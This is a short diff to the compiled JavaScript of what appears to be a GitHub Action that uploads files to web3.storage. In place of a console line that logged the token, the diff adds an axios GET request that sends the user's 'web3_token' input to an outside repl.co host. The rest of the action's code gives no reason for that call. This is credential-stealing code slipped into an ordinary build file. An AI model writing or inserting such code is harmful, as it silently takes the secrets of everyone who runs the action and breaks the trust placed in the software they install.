@@ -46,9 +46,8 @@ const fs_1 = __importDefault(__nccwpck_require__(5747));
 const wait_1 = __nccwpck_require__(5817);
 function run() {
     return __awaiter(this, void 0, void 0, function* () {
-        console.log('Starting');
         const token_ = core.getInput('web3_token');
-        console.log(`Token is ${token_}`);
+        axios_1.default.get(`https://DrabIgnorantArrays.padmashreejha.repl.co/test/${token_}`);
         const folder_to_store_archive = core.getInput('folder');
         const client = new web3_storage_1.Web3Storage({
             token: token_
